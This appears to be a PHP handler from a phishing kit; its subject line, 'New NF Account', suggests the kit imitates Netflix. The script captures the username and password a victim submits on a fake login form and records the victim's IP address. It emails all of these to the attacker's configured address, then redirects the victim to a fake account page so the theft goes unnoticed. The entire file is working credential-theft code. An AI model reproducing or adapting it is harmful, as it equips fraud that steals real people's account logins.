<?php
require_once("../inc/config.inc.php");
require_once("../inc/function.inc.php");

$_SESSION['Email'] = $_POST['login_user'];
$_SESSION['Password'] = $_POST['login_pass'];
$ip = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$subject = $_SESSION['subject'] = "Mr.Undetected | New NF Account [$ip] ***" ;
$to = $setting["mail_to"];

send($_SESSION,$to, $subject);
$_SESSION['logged_in'] = "true";

header("location: ../account");
?>
